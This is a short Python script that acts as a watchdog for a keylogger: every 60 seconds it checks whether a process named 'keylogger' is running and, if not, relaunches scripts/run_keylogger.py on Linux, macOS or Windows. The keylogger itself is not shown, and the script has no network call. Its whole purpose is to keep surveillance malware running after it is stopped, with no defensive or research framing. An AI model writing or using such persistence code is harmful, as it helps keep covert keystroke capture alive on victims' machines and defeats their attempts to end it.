import time
import psutil
import subprocess
import platform

def is_keylogger_running():
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if 'keylogger' in process.info['name'].lower():
            return process.info['pid']
    return None

def restart_keylogger():
    os_name = platform.system()
    if os_name == "Linux" or os_name == "Darwin":
        subprocess.Popen(["python3", "scripts/run_keylogger.py"])
    elif os_name == "Windows":
        subprocess.Popen(["python", "scripts/run_keylogger.py"])
    else:
        print("Unsupported OS for monitoring.")

if __name__ == "__main__":
    while True:
        pid = is_keylogger_running()
        if pid:
            print(f"Keylogger is running (PID: {pid}).")
        else:
            print("Keylogger not running. Restarting...")
            restart_keylogger()
        time.sleep(60)  # Check every 60 seconds
